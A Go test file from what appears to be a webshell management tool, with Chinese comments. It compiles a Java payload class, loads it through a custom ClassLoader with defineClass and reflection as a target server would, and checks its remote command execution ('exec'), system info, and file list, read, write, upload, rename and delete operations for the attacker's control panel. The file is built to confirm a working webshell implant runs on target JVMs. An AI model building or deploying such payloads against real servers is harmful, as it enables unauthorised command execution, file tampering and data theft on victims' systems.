package webshell

// javabuild_test.go — 验证「运行时编译」真的能产出可执行的载荷。
//
// 只断言「编译成功」是不够的：class 能生成但加载失败（类名不符、依赖缺失、
// 字节码版本过高）在目标端表现都是同一种「连不上」。这里把产物放进真正的 JVM
// 里跑一次命令执行，确认 defineClass + 反射调用这条链路通。

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// javaHost 目标端的最小同构：自定义 ClassLoader 从字节定义类，反射调 run()。
const javaHost = `import java.lang.reflect.*;
import java.nio.file.*;

public class Host {
    static final class L extends ClassLoader {
        private final byte[] b;
        L(byte[] b) { this.b = b; }
        Class<?> def() { return defineClass("forang.Payload", b, 0, b.length); }
    }
    public static void main(String[] a) throws Exception {
        byte[] b = Files.readAllBytes(Paths.get("forang", "Payload.class"));
        Class<?> c = new L(b).def();
        Method m = c.getMethod("run", String.class, String[].class);
        String[] args = new String[a.length - 1];
        for (int i = 1; i < a.length; i++) { args[i - 1] = a[i]; }
        System.out.print(m.invoke(null, a[0], (Object) args));
    }
}`

func TestBuildJavaPayload(t *testing.T) {
	ResetJavaPayloadCache()
	class, err := BuildJavaPayload()
	if err != nil {
		if strings.Contains(err.Error(), "未找到 javac") {
			t.Skip("本机无 JDK，跳过运行时编译验证")
		}
		t.Fatalf("编译失败: %v", err)
	}
	if len(class) < 8 {
		t.Fatalf("产物过短: %d 字节", len(class))
	}
	if class[0] != 0xCA || class[1] != 0xFE || class[2] != 0xBA || class[3] != 0xBE {
		t.Fatal("不是合法 class（magic 不符）")
	}
	major := binary.BigEndian.Uint16(class[6:8])
	if major > 52 {
		t.Fatalf("字节码主版本 %d，高于 Java 8 的 52，低版本目标端会拒载", major)
	}
	t.Logf("class %d 字节，主版本 %d", len(class), major)

	// 第二次必须走缓存且内容一致
	again, err := BuildJavaPayload()
	if err != nil || string(again) != string(class) {
		t.Fatalf("缓存返回不一致: %v", err)
	}
}

func TestJavaPayloadRunsInJVM(t *testing.T) {
	ResetJavaPayloadCache()
	class, err := BuildJavaPayload()
	if err != nil {
		t.Skip("本机无 JDK:", err)
	}
	javac, err := findJavac()
	if err != nil {
		t.Skip(err)
	}
	javaBin := filepath.Join(filepath.Dir(javac), "java")
	if _, statErr := os.Stat(javaBin + ".exe"); statErr == nil {
		javaBin += ".exe"
	} else if _, statErr := os.Stat(javaBin); statErr != nil {
		t.Skip("找不到 java 可执行文件")
	}

	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "forang"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "forang", "Payload.class"), class, 0o644); err != nil {
		t.Fatal(err)
	}
	hostPath := filepath.Join(dir, "Host.java")
	if err := os.WriteFile(hostPath, []byte(javaHost), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(javac, "-d", dir, hostPath).CombinedOutput(); err != nil {
		t.Fatalf("编译宿主失败: %v\n%s", err, out)
	}

	run := func(op, arg string) string {
		cmd := exec.Command(javaBin, "-cp", dir, "Host", op, arg)
		// 宿主按相对路径读 forang/Payload.class，工作目录必须是产物所在目录
		cmd.Dir = dir
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("%s 执行失败: %v\n%s", op, err, out)
		}
		return string(out)
	}

	if got := run("exec", "echo forang-ok"); !strings.Contains(got, "forang-ok") {
		t.Fatalf("命令执行输出异常: %q", got)
	}
	if got := run("info", ""); !strings.Contains(got, "java.version=") {
		t.Fatalf("info 输出异常: %q", got)
	}
	if got := run("ping", ""); !strings.Contains(got, PongMarker) {
		t.Fatalf("ping 输出异常: %q", got)
	}
	// 未知操作必须走 ERROR 约定，不能静默返回空串
	if got := run("nosuchop", ""); !strings.HasPrefix(got, "ERROR:") {
		t.Fatalf("未知操作应返回 ERROR:，实际 %q", got)
	}
}

// javaRunner 编译宿主并返回一个可传多参的执行器，以及产物所在目录。
// 文件操作要传 2-3 个参数，单参宿主覆盖不到。
func javaRunner(t *testing.T) func(op string, args ...string) string {
	t.Helper()
	ResetJavaPayloadCache()
	class, err := BuildJavaPayload()
	if err != nil {
		t.Skip("本机无 JDK:", err)
	}
	javac, err := findJavac()
	if err != nil {
		t.Skip(err)
	}
	javaBin := filepath.Join(filepath.Dir(javac), "java")
	if _, statErr := os.Stat(javaBin + ".exe"); statErr == nil {
		javaBin += ".exe"
	} else if _, statErr := os.Stat(javaBin); statErr != nil {
		t.Skip("找不到 java 可执行文件")
	}
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "forang"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "forang", "Payload.class"), class, 0o644); err != nil {
		t.Fatal(err)
	}
	hostPath := filepath.Join(dir, "Host.java")
	if err := os.WriteFile(hostPath, []byte(javaHost), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(javac, "-d", dir, hostPath).CombinedOutput(); err != nil {
		t.Fatalf("编译宿主失败: %v\n%s", err, out)
	}
	return func(op string, args ...string) string {
		argv := append([]string{"-cp", dir, "Host", op}, args...)
		cmd := exec.Command(javaBin, argv...)
		cmd.Dir = dir
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("%s 执行失败: %v\n%s", op, err, out)
		}
		return string(out)
	}
}

// TestJavaPayloadFileOps 文件管理必须和脚本载体同格式：
// list 出 JSON 数组（name/size/is_dir/mtime）、read 出 base64、其余出 OK。
// 前端按这套约定解析，格式一旦漂移，面板就是「目录解析失败」。
func TestJavaPayloadFileOps(t *testing.T) {
	run := javaRunner(t)

	work := t.TempDir()
	txt := filepath.Join(work, "hello.txt")
	if err := os.WriteFile(txt, []byte("hello-中文"), 0o644); err != nil {
		t.Fatal(err)
	}
	sub := filepath.Join(work, "subdir")
	if err := os.MkdirAll(sub, 0o755); err != nil {
		t.Fatal(err)
	}

	// list：字段齐全、目录标 is_dir、中文名不损坏
	raw := run("list", work)
	var rows []struct {
		Name  string `json:"name"`
		Size  int64  `json:"size"`
		IsDir bool   `json:"is_dir"`
		Mtime int64  `json:"mtime"`
	}
	if err := json.Unmarshal([]byte(raw), &rows); err != nil {
		t.Fatalf("list 输出不是合法 JSON: %v\n%s", err, raw)
	}
	var gotFile, gotDir bool
	for _, r := range rows {
		if r.Name == "hello.txt" && !r.IsDir && r.Size == int64(len("hello-中文")) {
			gotFile = true
		}
		if r.Name == "subdir" && r.IsDir {
			gotDir = true
		}
	}
	if !gotFile || !gotDir {
		t.Fatalf("list 缺少文件或目录条目: %s", raw)
	}

	// read：base64，且能还原中文
	b64 := strings.TrimSpace(run("read", txt))
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil || string(data) != "hello-中文" {
		t.Fatalf("read 结果不对: %v %q", err, string(data))
	}

	// write 文本 → 再读回
	out := filepath.Join(work, "写.txt")
	if got := strings.TrimSpace(run("write", out, "内容ABC")); got != "OK" {
		t.Fatalf("write 文本返回 %q", got)
	}
	if b, err := os.ReadFile(out); err != nil || string(b) != "内容ABC" {
		t.Fatalf("写盘内容不对: %v %q", err, string(b))
	}

	// write b64 → 二进制字节完全一致（上传大文件走这条路）
	bin := []byte{0x00, 0x01, 0xff, 0xfe, 0x7f, 0x80}
	binPath := filepath.Join(work, "bin.dat")
	if got := strings.TrimSpace(run("write", binPath, base64.StdEncoding.EncodeToString(bin), "b64")); got != "OK" {
		t.Fatalf("write b64 返回 %q", got)
	}
	if b, err := os.ReadFile(binPath); err != nil || string(b) != string(bin) {
		t.Fatalf("二进制写盘不一致: %v %x", err, b)
	}

	// mkdir / rename / delete
	newDir := filepath.Join(work, "made")
	if got := strings.TrimSpace(run("mkdir", newDir)); got != "OK" {
		t.Fatalf("mkdir 返回 %q", got)
	}
	if st, err := os.Stat(newDir); err != nil || !st.IsDir() {
		t.Fatalf("mkdir 未生效: %v", err)
	}
	renamed := filepath.Join(work, "改名.txt")
	if got := strings.TrimSpace(run("rename", out, renamed)); got != "OK" {
		t.Fatalf("rename 返回 %q", got)
	}
	if _, err := os.Stat(renamed); err != nil {
		t.Fatalf("rename 未生效: %v", err)
	}
	if got := strings.TrimSpace(run("delete", renamed)); got != "OK" {
		t.Fatalf("delete 返回 %q", got)
	}
	if _, err := os.Stat(renamed); !os.IsNotExist(err) {
		t.Fatalf("delete 未生效: %v", err)
	}

	// 错误路径统一 ERROR 前缀，别返回空串让前端以为成功
	for _, c := range []struct{ op, arg string }{
		{"read", filepath.Join(work, "no-such-file")},
		{"list", filepath.Join(work, "no-such-dir")},
		{"delete", filepath.Join(work, "no-such-file")},
	} {
		if got := run(c.op, c.arg); !strings.HasPrefix(got, "ERROR:") {
			t.Fatalf("%s 不存在时应返回 ERROR:，实际 %q", c.op, got)
		}
	}
}
